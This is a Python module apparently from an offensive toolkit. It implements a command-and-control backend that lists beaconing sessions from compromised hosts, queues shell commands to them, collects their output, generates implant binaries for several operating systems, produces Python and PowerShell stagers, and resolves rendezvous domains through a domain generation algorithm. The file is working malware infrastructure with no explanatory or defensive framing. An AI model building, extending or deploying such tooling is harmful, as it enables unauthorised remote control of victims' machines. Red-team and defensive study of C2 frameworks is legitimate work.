"""Native C2 backend — managed beacon protocol + DGA + implant builder.

Operates independently of Sliver. Provides full beacon lifecycle:
registration, encrypted tasking, result collection, and DGA-based
C2 endpoint discovery.
"""
import asyncio
import logging
import os
import time
import uuid
from typing import Optional

from .beacon import BeaconProtocol, BeaconSession, BeaconTask
from .dga import DGAResolver
from .implant_builder import ImplantBuilder, ImplantBuildResult
from .models import C2Session, ImplantConfig, TaskResult, SessionStatus

logger = logging.getLogger("c2.native")


class NativeC2Backend:
    def __init__(self, c2_url: str = "https://127.0.0.1:8443", shared_secret: str = ""):
        self._name = "native"
        self._c2_url = c2_url
        self._shared_secret = shared_secret or os.getenv("C2_SHARED_SECRET", "")
        self._beacon = BeaconProtocol(secret=self._shared_secret.encode() if self._shared_secret else b"")
        self._dga = DGAResolver()
        self._builder = ImplantBuilder(c2_url=c2_url, shared_secret=self._shared_secret)
        self._available = True

    @property
    def available(self) -> bool:
        return self._available

    @property
    def beacon(self) -> BeaconProtocol:
        return self._beacon

    @property
    def dga(self) -> DGAResolver:
        return self._dga

    @property
    def builder(self) -> ImplantBuilder:
        return self._builder

    async def list_sessions(self) -> list[C2Session]:
        sessions = self._beacon.list_sessions()
        return [
            C2Session(
                id=s.id, hostname=s.hostname, address=s.address,
                os=s.os, arch=s.arch, transport=s.transport,
                status=SessionStatus(s.status),
                last_checkin=s.last_checkin,
            )
            for s in sessions
        ]

    async def generate_implant(self, config: ImplantConfig) -> bytes:
        format_map = {"exe": "exe", "dll": "dll", "elf": "elf", "macho": "macho"}
        result = await self._builder.build(
            target_os=config.os,
            arch=config.arch,
            format=format_map.get(config.format, "exe"),
            name=config.name,
        )
        return result.data if result and not result.error else b""

    async def send_task(self, session_id: str, command: str) -> TaskResult:
        task = self._beacon.enqueue_task(session_id, command)
        if not task:
            return TaskResult(
                session_id=session_id, task_id="",
                output="", error="Session not found",
                completed=False,
            )

        session = self._beacon.get_session(session_id)
        deadline = time.time() + 120
        while time.time() < deadline:
            completed = self._beacon._completed_tasks.get(task.id)
            if completed and (completed.status == "completed" or completed.status == "failed"):
                return TaskResult(
                    session_id=session_id, task_id=task.id,
                    output=completed.result or "",
                    error=completed.error,
                    completed=completed.status == "completed",
                    duration=time.time() - task.created,
                )
            await asyncio.sleep(2)

        return TaskResult(
            session_id=session_id, task_id=task.id,
            output="", error="Task timed out waiting for result",
            completed=False,
            duration=time.time() - task.created,
        )

    async def socks_start(self, session_id: str, port: int = 1081) -> Optional[str]:
        return None

    async def socks_stop(self, session_id: str):
        logger.debug(f"socks_stop called for session {session_id} - no SOCKS proxy in native backend")

    async def stop(self):
        self._available = False
        logger.info("NativeC2Backend stopped - cleared session state")

    def get_dead_drop_urls(self, count: int = 5) -> list[str]:
        return self._dga.generate_c2_urls(count=count)

    def verify_dead_drop(self, domain: str) -> bool:
        return self._dga.verify_domain(domain)

    def get_python_stager(self, session_id: str = "") -> str:
        sid = session_id or uuid.uuid4().hex[:16]
        return self._builder.build_python_stager(sid)

    def get_powershell_stager(self, session_id: str = "") -> str:
        sid = session_id or uuid.uuid4().hex[:16]
        return self._builder.build_powershell_stager(sid)
